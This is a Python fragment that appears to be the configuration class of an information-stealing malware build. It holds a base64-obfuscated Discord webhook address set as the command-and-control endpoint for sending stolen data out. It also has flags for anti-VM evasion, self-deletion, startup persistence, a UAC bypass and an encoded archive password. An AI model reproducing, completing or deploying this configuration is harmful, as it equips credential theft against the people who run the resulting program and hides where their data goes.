...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI0ODU5ODU2NDM0MzY0ODI5Ny9tMFlVTEd3eXNLNTZ6ZE8tZi1Sa2tnUklSZHkyTXJ4Q21KWnItWEdCWUktaW5EeWFmckd6UDRfN0JzX0FvOUE2ZWptZw==').decode())
    Mutex = base64.b64decode('NUdoYTNOeWVCMVUwUk5VVQ==').decode()
    PingMe = bool('true')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('true')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('eXVqaW4=').decode()
